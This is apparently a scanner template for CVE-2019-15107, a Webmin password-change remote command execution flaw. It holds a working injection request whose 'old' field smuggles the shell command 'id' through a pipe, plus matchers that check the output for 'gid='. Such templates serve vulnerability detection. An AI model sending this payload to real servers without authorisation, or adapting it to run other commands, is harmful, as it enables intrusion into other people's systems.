id: CVE-2019-15107

info:
  name: Webmin Password Change RCE
  vul: https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107

requests:
  - method: POST
    path:
      - "{{BaseURL}}:10000/password_change.cgi"
    headers:
      Referer: "{{BaseURL}}:10000/session_login.cgi"
      Cookie: redirect=1; testing=1; sid=x; sessiontest=1
    body: user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2

    matchers:
      - type: dsl
        dsl:
          - status_code==200
          - contains(raw, "gid=")